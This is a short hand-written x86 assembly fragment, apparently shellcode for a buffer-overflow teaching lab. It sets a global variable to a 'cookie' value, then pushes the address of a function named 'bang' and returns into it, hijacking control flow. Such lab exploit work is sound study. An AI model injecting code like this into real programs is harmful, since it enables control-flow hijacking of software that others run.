#assembly code written by hand to turn into instruction codes
movl $0xd2e9eb7a, 0x8055120  #set global_value to cookie
pushl $0x08048c94	     #push address off bang onto the stack
ret  		 	     #return instruction
